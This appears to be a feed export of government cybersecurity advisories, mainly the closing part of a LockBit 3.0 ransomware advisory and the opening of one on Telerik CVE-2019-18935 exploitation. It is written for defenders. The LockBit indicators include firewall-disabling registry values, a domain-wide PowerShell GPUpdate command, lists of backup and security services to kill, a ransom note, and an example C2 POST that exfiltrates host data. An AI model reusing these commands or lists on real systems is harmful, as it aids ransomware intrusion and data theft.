REG_D
WORD</pre></td>
<td>
<pre>
0</pre></td>
</tr><tr><td>
<pre>
HKLM\SOFTWARE\Policies\Microsoft\Window
sFirewall\StandardProfile</pre></td>
<td>
<pre>
EnableFirewall</pre></td>
<td>
<pre>
REG_D
WORD</pre></td>
<td>
<pre>
0</pre></td>
</tr></tbody></table><h6>Force GPUpdate</h6>
<p>Once new group policies are added, a PowerShell command using Group Policy update (GPUpdate) applies the new group policy changes to all computers on the AD domain.</p>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist">Force GPUpdate Powershell Command</th>
</tr></thead><tbody><tr><td>powershell Get-ADComputer -filter * -Searchbase '%s' | Foreach-Object { Invoke- GPUpdate -computer $_.name -force -RandomDelayInMinutes 0}</td>
</tr></tbody></table><h6>Services Killed</h6>
<table><tbody><tr><td>vss</td>
<td>sql</td>
<td>svc$</td>
</tr><tr><td>memtas</td>
<td>mepocs</td>
<td>msexchange</td>
</tr><tr><td>sophos</td>
<td>veeam</td>
<td>backup</td>
</tr><tr><td>GxVss</td>
<td>GxBlr</td>
<td>GxFWD</td>
</tr><tr><td>GxCVD</td>
<td>GxCIMgr</td>
<td> </td>
</tr></tbody></table><h6>Processes Killed</h6>
<table><tbody><tr><td>sql</td>
<td>oracle</td>
<td>ocssd</td>
</tr><tr><td>dbsnmp</td>
<td>synctime</td>
<td>agntsvc</td>
</tr><tr><td>isqlplussvc</td>
<td>xfssvccon</td>
<td>mydesktopservice</td>
</tr><tr><td>ocautoupds</td>
<td>encsvc</td>
<td>firefox</td>
</tr><tr><td>tbirdconfig</td>
<td>mydesktopqos</td>
<td>ocomm</td>
</tr><tr><td>dbeng50</td>
<td>sqbcoreservice</td>
<td>excel</td>
</tr><tr><td>infopath</td>
<td>msaccess</td>
<td>mspu</td>
</tr><tr><td>onenote</td>
<td>outlook</td>
<td>powerpnt</td>
</tr><tr><td>steam</td>
<td>thebat</td>
<td>thunderbird</td>
</tr><tr><td>visio</td>
<td>winword</td>
<td>wordpad</td>
</tr><tr><td>notepad</td>
<td> </td>
<td> </td>
</tr></tbody></table><h6>LockBit 3.0 Ransom Note</h6>
<blockquote><p>~~~ LockBit 3.0 the world's fastest and most stable ransomware from 2019~~~<br />
>>>>> Your data is stolen and encrypted.<br />
If you don't pay the ransom, the data will be published on our TOR darknet sites. Keep in mind that once your data appears on our leak site, it could be bought by your competitors at any second, so don't hesitate for a long time. The sooner you pay the ransom, the sooner your company will be safe.</p>
</blockquote>
<h6>Network Connections</h6>
<p>If configured, Lockbit 3.0 will send two HTTP POST requests to one of the C2servers. Information about the victim host and bot are encrypted with an Advanced Encryption Standard (AES) key and encoded in Base64.</p>
<table><tbody><tr><td>
<pre>
Example of HTTP POST request
POST <strong><Lockbit C2></strong>/?7F6Da=u5a0TdP0&Aojq=&NtN1W=OuoaovMvrVJSmPNaA5&fckp9=FCYyT6b7kdyeEXywS8I8 HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate, br Content-Type: text/plain
User-Agent: Safari/537.36 <strong><Lockbit User Agent String></strong>
Host: <strong><Lockbit C2></strong>
Connection: Keep-Alive LIWy=RJ51lB5GM&a4OuN=<strong><em><Lockbit
ID></em></strong>&LoSyE3=8SZ1hdlhzld4&DHnd99T=rTx9xGlInO6X0zWW&2D6=Bokz&T1guL=MtRZsFCRMKyBmfmqI& 6SF3g=JPDt9lfJIQ&wQadZP=<strong><em><Base64 encrypted data></em></strong> Xni=AboZOXwUw&2rQnM4=94L&0b=ZfKv7c&NO1d=M2kJlyus&AgbDTb=xwSpba&8sr=EndL4n0HVZjxPR& m4ZhTTH=sBVnPY&xZDiygN=cU1pAwKEztU&=5q55aFIAfTVQWTEm&4sXwVWcyhy=l68FrIdBESIvfCkvYl
Example of information found in encrypted data
{
"bot_version":"X",
"bot_id":"X",
"bot_company":"X", "host_hostname":"X", "host_user":"X",
"host_os":"X",
"host_domain":"X",
"host_arch":"X",
"host_lang":"X", "disks_info":[
{
"disk_name":"X",
"disk_size":"XXXX", "free_size":"XXXXX"
}</pre></td>
</tr></tbody></table><h6>User Agent Strings</h6>
<table><tbody><tr><td>Mozilla/5.0 (Windows NT<br />
			6.1)</td>
<td>AppleWebKit/587.38<br />
			(KHTML, like Gecko)</td>
<td>Chrome/91.0.4472.77</td>
</tr><tr><td>Safari/537.36</td>
<td>Edge/91.0.864.37</td>
<td>Firefox/89.0</td>
</tr><tr><td>Gecko/20100101</td>
<td> </td>
<td> </td>
</tr></tbody></table><h4><strong>MITRE ATT&CK TECHNIQUES</strong></h4>
<p>See Table 3 for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping to the MITRE ATT&CK framework, see CISA’s <a href="https://www.cisa.gov/news-events/alerts/2023/03/01/cisa-releases-decider-tool-help-mitre-attck-mapping">Decider Tool</a> and <a href="https://www.cisa.gov/news-events/alerts/2023/01/17/cisa-updates-best-practices-mapping-mitre-attckr">Best Practices for MITRE ATT&CK Mapping Guide</a>.</p>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><caption><em>Table 3: LockBit 3.0 Actors ATT&CK Techniques for Enterprise</em></caption>
<thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist"><u>Initial Access</u></th>
<th scope="col" role="columnheader"> </th>
<th scope="col" role="columnheader"> </th>
</tr></thead><tbody><tr><th role="columnheader">Technique Title</th>
<th role="columnheader">ID</th>
<th role="columnheader">Use</th>
</tr><tr><td>Valid Accounts</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1078/">T1078</a></td>
<td>LockBit 3.0 actors obtain and abuse credentials of existing accounts as a means of gaining initial access.</td>
</tr><tr><td>Exploit External Remote Services</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1133/">T1133</a></td>
<td>LockBit 3.0 actors exploit RDP to gain access to victim networks.</td>
</tr><tr><td>Drive-by Compromise</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1189/">T1189</a></td>
<td>LockBit 3.0 actors gain access to a system through a user visiting a website over the normal course of browsing.</td>
</tr><tr><td>Exploit Public-Facing Application</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1190/">T1190</a></td>
<td>LockBit 3.0 actors exploit vulnerabilities in internet-facing systems to gain access to victims’ systems.</td>
</tr><tr><td>Phishing</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1566/">T1566</a></td>
<td>LockBit 3.0 actors use phishing and spearphishing to gain access to victims' networks.</td>
</tr><tr><th role="columnheader"><u><strong>Execution</strong></u></th>
<th role="columnheader"> </th>
<th role="columnheader"> </th>
</tr><tr><th role="columnheader">Technique Title</th>
<th role="columnheader">ID</th>
<th role="columnheader">Use</th>
</tr><tr><td>Execution</td>
<td><a href="https://attack.mitre.org/versions/v12/tactics/TA0002/">TA0002</a></td>
<td>LockBit 3.0 launches commands during its execution.</td>
</tr><tr><td>Software Deployment Tools</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1072/">T1072</a></td>
<td>LockBit 3.0 uses Chocolatey, a command- line package manager for Windows.</td>
</tr><tr><th role="columnheader"><u><strong>Persistence</strong></u></th>
<th role="columnheader"> </th>
<th role="columnheader"> </th>
</tr><tr><th role="columnheader">Technique Title</th>
<th role="columnheader">ID</th>
<th role="columnheader">Use</th>
</tr><tr><td>Valid Accounts</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1078/">T1078</a></td>
<td>LockBit 3.0 uses a compromised user account to maintain persistence on the target network.</td>
</tr><tr><td>Boot or Logo Autostart Execution</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1547/">T1547</a></td>
<td>LockBit 3.0 enables automatic logon for persistence.</td>
</tr><tr><th role="columnheader"><strong><u>Privilege Escalation</u></strong></th>
<th role="columnheader"> </th>
<th role="columnheader"> </th>
</tr><tr><th role="columnheader">Technique Title</th>
<th role="columnheader">ID</th>
<th role="columnheader">Use</th>
</tr><tr><td>Privilege Escalation</td>
<td><a href="https://attack.mitre.org/versions/v12/tactics/TA0004/">TA0004</a></td>
<td>Lockbit 3.0 will attempt to escalate to the required privileges if current account privileges are insufficient.</td>
</tr><tr><td>Boot or Logo Autostart Execution</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1547/">T1547</a></td>
<td>LockBit 3.0 enables automatic logon for privilege escalation.</td>
</tr><tr><th role="columnheader"><u><strong>Defense Evasion</strong></u></th>
<th role="columnheader"> </th>
<th role="columnheader"> </th>
</tr><tr><th role="columnheader">Technique Title</th>
<th role="columnheader">ID</th>
<th role="columnheader">Use</th>
</tr><tr><td>Obfuscated Files or Information</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1027/">T1027</a></td>
<td>LockBit 3.0 will send encrypted host and bot information to its C2 servers.</td>
</tr><tr><td>Indicator Removal: File Deletion</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1070/004/">T1070.004</a></td>
<td>LockBit 3.0 will delete itself from the disk.</td>
</tr><tr><td>Execution Guardrails: Environmental Keying</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1480/001/">T1480.001</a></td>
<td>LockBit 3.0 will only decrypt the main component or continue to decrypt and/or decompress data if the correct password is entered.</td>
</tr><tr><th role="columnheader"><u><strong>Credential Access</strong></u></th>
<th role="columnheader"> </th>
<th role="columnheader"> </th>
</tr><tr><th role="columnheader">Technique Title</th>
<th role="columnheader">ID</th>
<th role="columnheader">Use</th>
</tr><tr><td>OS Credential Dumping: LSASS Memory</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1003/001/">T1003.001</a></td>
<td>LockBit 3.0 uses Microsoft Sysinternals ProDump to dump the contents of LSASS.exe.</td>
</tr><tr><th role="columnheader"><u><strong>Discovery</strong></u></th>
<th role="columnheader"> </th>
<th role="columnheader"> </th>
</tr><tr><th role="columnheader">Technique Title</th>
<th role="columnheader">ID</th>
<th role="columnheader">Use</th>
</tr><tr><td>Network Service Discovery</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1046/">T1046</a></td>
<td>LockBit 3.0 uses SoftPerfect Network Scanner to scan target networks.</td>
</tr><tr><td>System Information Discovery</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1082/">T1082</a></td>
<td>LockBit 3.0 will enumerate system information to include hostname, host configuration, domain information, local drive configuration, remote shares, and mounted external storage devices.</td>
</tr><tr><td>System Location   Discovery: System Language Discovery</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1614/001/">T1614.001</a></td>
<td>LockBit 3.0 will not infect machines with language settings that match a defined exclusion list.</td>
</tr><tr><th role="columnheader"><strong><u>Lateral Movement</u></strong></th>
<th role="columnheader"> </th>
<th role="columnheader"> </th>
</tr><tr><th role="columnheader">Technique Title</th>
<th role="columnheader">ID</th>
<th role="columnheader">Use</th>
</tr><tr><td>Remote Services:   Remote Desktop Protocol</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1021/001/">T1021.001</a></td>
<td>LockBit 3.0 uses Splashtop remote- desktop software to facilitate lateral movement.</td>
</tr><tr><th role="columnheader"><strong><u>Command and Control</u></strong></th>
<th role="columnheader"> </th>
<th role="columnheader"> </th>
</tr><tr><th role="columnheader">Technique Title</th>
<th role="columnheader">ID</th>
<th role="columnheader">Use</th>
</tr><tr><td>Application Layer Protocol: File Transfer Protocols</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1071/002/">T1071.002</a></td>
<td>LockBit 3.0 uses FileZilla for C2.</td>
</tr><tr><td>Protocol Tunnel</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1572/">T1572</a></td>
<td>LockBit 3.0 uses Plink to automate SSH actions on Windows.</td>
</tr><tr><th role="columnheader"><u><strong>Exfiltration</strong></u></th>
<th role="columnheader"> </th>
<th role="columnheader"> </th>
</tr><tr><th role="columnheader">Technique Title</th>
<th role="columnheader">ID</th>
<th role="columnheader">Use</th>
</tr><tr><td>Exfiltration</td>
<td><a href="https://attack.mitre.org/versions/v12/tactics/TA0010/">TA0010</a></td>
<td>LockBit 3.0 uses Stealbit, a custom exfiltration tool first used with LockBit 2.0, to steal data from a target network.</td>
</tr><tr><td>Exfiltration Over Web Service</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1567/">T1567</a></td>
<td>LockBit 3.0 uses publicly available file sharing services to exfiltrate a target’s data.</td>
</tr><tr><td>Exfiltration Over Web Service: Exfiltration to Cloud Storage</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1567/002/">T1567.002</a></td>
<td>LockBit 3.0 actors use (1) rclone, an open source command line cloud storage manager to exfiltrate and (2) MEGA, a publicly available file sharing service for data exfiltration.</td>
</tr><tr><th role="columnheader"><strong><u>Impact</u></strong></th>
<th role="columnheader"> </th>
<th role="columnheader"> </th>
</tr><tr><th role="columnheader">Technique Title</th>
<th role="columnheader">ID</th>
<th role="columnheader">Use</th>
</tr><tr><td>Data Destruction</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1485/">T1485</a></td>
<td>LockBit 3.0 deletes log files and empties the recycle bin.</td>
</tr><tr><td>Data Encrypted for Impact</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1486/">T1486</a></td>
<td>LockBit 3.0 encrypts data on target systems to interrupt availability to system and network resources.</td>
</tr><tr><td>Service Stop</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1489/">T1489</a></td>
<td>LockBit 3.0 terminates processes and services.</td>
</tr><tr><td>Inhibit System Recovery</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1490/">T1490</a></td>
<td>LockBit 3.0 deletes volume shadow copies residing on disk.</td>
</tr><tr><td>Defacement: Internal Defacement</td>
<td><a href="https://attack.mitre.org/versions/v12/techniques/T1491/001/">T1491.001</a></td>
<td>LockBit 3.0 changes the host system’s wallpaper and icons to the LockBit 3.0 wallpaper and icons, respectively.</td>
</tr></tbody></table><h4><strong>MITIGATIONS</strong></h4>
<p>The FBI, CISA, and the MS-ISAC recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture on the basis of LockBit 3.0’s activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful TTPs. Visit CISA’s <a href="https://www.cisa.gov/cpg">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<ul><li><strong>Implement a recovery plan</strong> to maintain and retain multiple copies of sensitive or proprietary data and servers [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 7.3</a>] in a physically separate, segmented, and secure location (e.g., hard drive, storage device, the cloud).</li>
<li><strong>Require all accounts</strong> with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with <a href="https://pages.nist.gov/800-63-3/">National Institute for Standards and Technology (NIST) standards</a> for developing and managing password policies [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 3.4</a>].
<ul><li>Use longer passwords consisting of at least 8 characters and no more than 64 characters in length [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 1.4</a>]</li>
<li>Store passwords in hashed format using industry-recognized password managers</li>
<li>Add password user “salts” to shared login credentials</li>
<li>Avoid reusing passwords</li>
<li>Implement multiple failed login attempt account lockouts [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 1.1</a>]</li>
<li>Disable password “hints”</li>
<li>Refrain from requiring password changes more frequently than once per year. <strong>Note: </strong>NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.</li>
<li>Require administrator credentials to install software</li>
</ul></li>
<li><strong>Require phishing-resistant multifactor authentication</strong> [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 1.3</a>] for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems.</li>
<li><strong>Keep all operating systems, software, and firmware up to date.</strong> Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats.</li>
<li><strong>Segment networks</strong> [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 8.1</a>] to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement.</li>
<li><strong>Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool.</strong> To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 5.1</a>]. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.</li>
<li><strong>Install, regularly update, and enable real time detection for antivirus software</strong> on all hosts.</li>
<li><strong>Review domain controllers, servers, workstations, and active directories</strong> for new and/or unrecognized accounts.</li>
<li><strong>Audit user accounts</strong> with administrative privileges and configure access controls according to the principle of least privilege [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 1.5</a>].</li>
<li><strong>Disable unused ports.</strong></li>
<li><strong>Consider adding an email banner to emails </strong>[<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 8.3</a>] received from outside your organization.</li>
<li><strong>Disable hyperlinks</strong> in received emails.</li>
<li><strong>Implement time-based access for accounts set at the admin level and higher.</strong> For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.</li>
<li><strong>Disable command-line and scripting activities and permissions.</strong> Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally.</li>
<li><strong>Maintain offline backups of data,</strong> and regularly maintain backup and restoration [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 7.3</a>]. By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data.</li>
<li><strong>Ensure all backup data is encrypted, immutable </strong>(i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 3.3</a>].</li>
</ul><h4><strong>VALIDATE SECURITY CONTROLS</strong></h4>
<p>In addition to applying mitigations, the FBI, CISA, and the MS-ISAC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The FBI, CISA, and the MS-ISAC authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.<br />
To get started:</p>
<ol><li>Select an ATT&CK technique described in this advisory (see Table 3).</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol><p>The FBI, CISA, and the MS-ISAC recommend continually testing your security program at scale and in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.</p>
<h4><strong>RESOURCES</strong></h4>
<ul><li><a href="https://www.stopransomware.gov/">Stopransomware.gov</a> is a whole-of-government approach that gives one central location for ransomware resources and alerts.</li>
<li>Resource to mitigate a ransomware attack: <a href="https://www.cisa.gov/sites/default/files/publications/CISA_MS-ISAC_Ransomware%20Guide_S508C.pdf">CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide</a>.</li>
<li>No-cost cyber hygiene services: <a href="https://www.cisa.gov/cyber-hygiene-services">Cyber Hygiene Services</a> and <a href="https://github.com/cisagov/cset/releases/tag/v10.3.0.0">Ransomware Readiness Assessment</a>.</li>
</ul><h4><strong>REPORTING</strong></h4>
<p>The FBI is seeking any information that can be legally shared, including:</p>
<ul><li>Boundary logs showing communication to and from foreign IP addresses</li>
<li>Sample ransom note</li>
<li>Communications with LockBit 3.0 actors</li>
<li>Bitcoin wallet information</li>
<li>Decryptor files</li>
<li>Benign sample of an encrypted file</li>
</ul><p>The FBI, CISA, and MS-ISAC do not encourage paying ransom, as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a <a href="https://www.fbi.gov/contact-us/field-offices">local FBI Field Office</a> or CISA at <a href="mailto:report@cisa.gov">report@cisa.gov</a>. State, local, tribal, and territorial (SLTT) government entities can also report to the MS-ISAC (<a href="mailto:SOC@cisecurity.org">SOC@cisecurity.org</a> or 866-787-4722).</p>
<h4><strong>DISCLAIMER</strong></h4>
<p>The information in this report is being provided “as is” for informational purposes only. The FBI, CISA, and the MS-ISAC do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the FBI, CISA, or the MS-ISAC.</p>
<p>Your feedback is important. Please take a few minutes to share your opinions on this product through an anonymous <a href="https://www.surveymonkey.com/r/CISA-cyber-survey?product=%5bproduct_value%5d">Product Feedback Survey</a>.</p>

## pubDate
Wed, 15 Mar 2023 15:20:17 EDT
## dc:creator
CISA
## guid
## @isPermaLink
false
## #text
/node/17648
## -
## title
Threat Actors Exploit Progress Telerik Vulnerability in U.S. Government IIS Server
## link
https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-074a
## description
<h4><strong>SUMMARY</strong></h4>
<p>From November 2022 through early January 2023, the Cybersecurity and Infrastructure Security Agency (CISA) and authoring organizations identified the presence of indicators of compromise (IOCs) at a federal civilian executive branch (FCEB) agency. Analysts determined that multiple cyber threat actors, including an APT actor, were able to exploit a .NET deserialization vulnerability (<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-18935" title="CVE-2019-18935">CVE-2019-18935</a>) in Progress Telerik user interface (UI) for ASP.NET AJAX, located in the agency’s Microsoft Internet Information Services (IIS) web server. Successful exploitation of this vulnerability allows for remote code execution. According to Progress Software, Telerik UI for ASP.NET AJAX builds before R1 2020 (2020.1.114) are vulnerable to this exploit.[<a href="https://docs.telerik.com/devtools/aspnet-ajax/knowledge-base/common-allows-javascriptserializer-deserialization" title="Allows JavaScriptSerializer Deserialization">1</a>]</p>
<p><strong>Actions to take today to mitigate malicious cyber activity:</strong></p>
<ul><li>Implement a patch management solution to ensure compliance with the latest security patches.</li>
<li>Validate output from patch management and vulnerability scanning against running services to check for discrepancies and account for all services.</li>
<li>Limit service accounts to the minimum permissions necessary to run services.</li>
</ul><p>CISA, the Federal Bureau of Investigation (FBI), and the Multi-State Information Sharing and Analysis Center (MS-ISAC) are releasing this joint Cybersecurity Advisory (CSA) to provide IT infrastructure defenders with tactics, techniques, and procedures (TTPs), IOCs, and methods to detect and protect against similar exploitation.</p>
<p>Download the PDF version of this report:</p>



<div class="align-center c-file">
    <div class="c-file__download">
    <a href="https://www.cisa.gov/sites/default/files/2023-03/aa23-074a-threat-actors-exploit-telerik-vulnerability-in-us-government-iis-server_1.pdf" class="c-file__link" target="_blank">Threat Actors Exploit Progress Telerik Vulnerability in U.S. Government IIS Server</a>
    <span class="c-file__size">(PDF,       742.54 KB
  )</span>
  </div>
</div>
<p>For a downloadable copy of IOCs, see</p>



<div class="align-center c-file">
    <div class="c-file__download">
    <a href="https://www.cisa.gov/sites/default/files/2023-03/aa23-074a.stix__0.xml" class="c-file__link" target="_blank">AA23-074A STIX XML</a>
    <span class="c-file__size">(XML,       30.96 KB
  )</span>
  </div>
</div>
<h4><strong>TECHNICAL DETAILS</strong></h4>
<p><strong>Note:</strong> This advisory uses the <a href="https://attack.mitre.org/versions/v12/matrices/enterprise/" title="Enterprise Matrix">MITRE ATT&CK® for Enterprise</a> framework, version 12. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques with corresponding detection and mitigation recommendations.</p>
<h5><strong>Overview</strong></h5>
<p>CISA and authoring organizations assess that, beginning as late as November 2022, threat actors successfully exploited a .NET deserialization vulnerability (CVE-2019-18935) in an instance of Telerik UI for ASP.NET AJAX Q2 2013 SP1 (version 2013.2.717) running on an FCEB agency’s Microsoft IIS server. This exploit, which results in interactive access with the web server, enabled the threat actors to successfully execute remote code on the vulnerable web server. Though the agency’s vulnerability scanner had the appropriate plugin for CVE-2019-18935, it failed to detect the vulnerability due to the Telerik UI software being installed in a file path it does not typically scan. This may be the case for many software installations, as file paths widely vary depending on the organization and installation method.</p>
<p>In addition to CVE-2019-18935, this version (2013.2.717) of Telerik UI for ASP.NET AJAX contains the following known vulnerabilities: <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-11357" title="CVE-2017-11357">CVE-2017-11357</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-11317" title="CVE-2017-11317">CVE-2017-11317</a>, and <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-9248" title="CVE-2017-9248">CVE-2017-9248</a>. Analysis suggests that cyber threat actors exploited CVE-2019-18935 in conjunction with either CVE-2017-11357 or CVE-2017-11317. Australian Cyber Security Centre (ACSC) Advisory 2020-004 assesses that exploitation of CVE-2019-18935 is only possible with knowledge of Telerik RadAsyncUpload encryption keys.[<a href="https://www.cyber.gov.au/acsc/view-all-content/advisories/advisory-2020-004-remote-code-execution-vulnerability-being-actively-exploited-vulnerable-versions-telerik-ui-sophisticated-actors" title="Advisory 2020-004: Remote code execution vulnerability being actively exploited in vulnerable versions of Telerik UI by sophisticated actors">2</a>] Threat actors can obtain these keys through either prior knowledge or exploitation of vulnerabilities—CVE-2017-11357 or CVE-2017-11317—present in older, unpatched versions of Telerik released between 2007 and 2017. Forensic evidence is not available to definitively confirm exploitation of either CVE-2017-11357 or CVE-2017-11317.</p>
<h5><strong>Threat Actor Activity</strong></h5>
<p>CISA and authoring organizations observed multiple cyber threat actors, including an APT actor—hereafter referred to as Threat Actor 1 (TA1)—and known cybercriminal actor XE Group—hereafter referred to as Threat Actor 2 (TA2)—conducting reconnaissance and scanning activities [<a href="https://attack.mitre.org/versions/v12/techniques/T1595/002/" title="Active Scanning: Vulnerability Scanning">T1595.002</a>] that correlate to the successful exploitation of CVE-2019-18935 in the agency’s IIS server running Telerik UI for ASP.NET AJAX [<a href="https://attack.mitre.org/versions/v12/techniques/T1190/" title="Exploit Public-Facing Application">T1190</a>].</p>
<p>When exploiting the vulnerability, the threat actors uploaded malicious dynamic-link library (DLL) files (some masqueraded as portable network graphics [PNG] files) [<a href="https://attack.mitre.org/versions/v12/techniques/T1105/" title="Ingress Tool Transfer">T1105</a>] to the <code>C:\Windows\Temp\</code> directory. The malicious files were then executed from the <code>C:\Windows\Temp\</code> directory via the <code>w3wp.exe</code> process—a legitimate process that runs on IIS servers. This process is routine for handling requests sent to web servers and delivering content. The review of antivirus logs identified that some DLL files were created [<a href="https://attack.mitre.org/versions/v12/techniques/T1055/001/" title="Process Injection: Dynamic-link Library Injection">T1055.001</a>] and detected as early as August 2021.</p>
<p>CISA and authoring organizations confirmed that some malicious files dropped on the IIS server are consistent with a previously reported file naming convention that threat actors commonly use when exploiting CVE-2019-18935.[<a href="https://bishopfox.com/blog/cve-2019-18935-remote-code-execution-in-telerik-ui" title="CVE-2019-18935: Remote Code Execution via Insecure Deserialization in Telerik UI">3</a>] The threat actors name the files in the Unix Epoch time format and use the date and time as recorded on the target system. The file naming convention follows the pattern <code>[10 digits].[7 digits].dll</code> (e.g., a file created on October 31, 2022, could be <code>1667203023.5321205.dll</code>).</p>
<p>The names of some of the PNG files were misleading. For example, file <code>1596835329.5015914.png</code>, which decodes to August 7, 2020, 21:22:09 UTC, first appeared on October 13, 2022, but the file system shows a creation date of August 7, 2020. The uncorrelated Unix Epoch time format may indicate that the threat actors used the timestomping [<a href="https://attack.mitre.org/versions/v12/techniques/T1070/006/" title="Indicator Removal: Timestomp">T1070.006</a>] technique. This file naming convention is a primary IOC used by the threat actors.</p>
<p>In many cases, malicious artifacts were not available for analysis because the threat actors’ malware—that looks for and removes files with the .dll file extension—removed files [<a href="https://attack.mitre.org/versions/v12/techniques/T1070/004/" title="Indicator Removal: File Deletion">T1070.004</a>] from the <code>C:\Windows\Temp\</code> directory. Through full packet data capture analysis and reverse engineering of malicious DLL files, no indications of additional malicious activity or sub-processes were found executed by the <code>w3wp.exe</code> process. CISA observed error messages being sent to the threat actors’ command and control (C2) server when permission restraints prevented the service account from executing the malicious DLLs and writing new files.</p>
<p>Network activity analysis was consistent with the artifacts provided for review. Analysts did not observe evidence of privilege escalation or lateral movement.</p>
<h5>Threat Actor 1</h5>
<p>CISA and authoring organizations observed TA1 exploiting CVE-2019-18935 for system enumeration beginning in August 2022. The vulnerability allows a threat actor to upload malicious DLLs on a target system and execute them by abusing a legitimate process, e.g., the <code>w3wp.exe</code> process. In this instance, TA1 was able to upload malicious DLL files to the C:\Windows\Temp\ directory and then achieve remote code execution, executing the DLL files via the w3wp.exe process.</p>
